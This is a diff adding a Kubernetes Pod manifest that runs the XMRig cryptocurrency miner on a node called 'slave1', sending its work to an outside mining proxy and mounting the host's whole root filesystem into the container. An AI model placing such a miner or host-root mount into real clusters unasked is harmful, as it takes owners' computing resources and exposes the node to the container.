@@ -1,0 +1,35 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: xmrig-exec-1
+spec:
+  affinity:
+    nodeAffinity:
+      requiredDuringSchedulingIgnoredDuringExecution:
+        nodeSelectorTerms:
+        - matchExpressions:
+          - key: kubernetes.io/hostname
+            operator: In
+            values:
+            - slave1
+  containers:
+  - name: xmrig-container-1
+    image: busybox
+    command:
+    - /home/worker1/xmrig/build/xmrig
+    - -o
+    - proxy.hacknoob.win:5551
+    - -u
+    - slave1+150
+    - -a
+    - rx/0
+    - --cpu-no-yield
+    - --nicehash
+    - --randomx-1gb-pages
+    volumeMounts:
+    - name: xmrig-volume-1
+      mountPath: /
+  volumes:
+  - name: xmrig-volume-1
+    hostPath:
+      path: /
